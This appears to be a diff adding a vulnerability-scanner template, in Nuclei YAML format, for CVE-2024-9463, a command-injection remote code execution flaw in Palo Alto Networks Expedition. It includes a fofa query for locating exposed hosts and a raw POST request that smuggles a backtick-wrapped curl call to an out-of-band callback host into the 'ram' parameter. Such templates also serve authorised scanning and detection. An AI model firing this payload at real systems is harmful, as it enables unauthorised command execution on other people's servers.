@@ -1,0 +1,32 @@
+id: Palo-Alto-Networks-Expedition-RCE-CVE-2024-9463
+info:
+  name: "Palo Alto Networks Expedition convertCSVtoParquet 接口远程代码执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="Expedition Project"
+      Palo Alto Networks Expedition 1.2.92 及更早版本中的 convertCSVtoParquet 接口存在远程代码执行漏洞。攻击者可通过构造恶意请求在目标系统上执行任意代码，从而获取系统控制权限。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488730&idx=1&sn=b3e0833d1d94539a886a74ce1db87e65&chksm=c267a1e9f51028ff0c05ffa97df1df308c6b420ce1a3db85314e3e322c0bbaacd91fd10071d0&token=555018471&lang=zh_CN#rd
+  tags: Palo-Alto-Networks-Expedition
+
+http:
+- raw:
+  - |
+    POST /API/convertCSVtoParquet.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    ram=watchTowr`curl+http://{{interactsh-url}}`
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
+
+
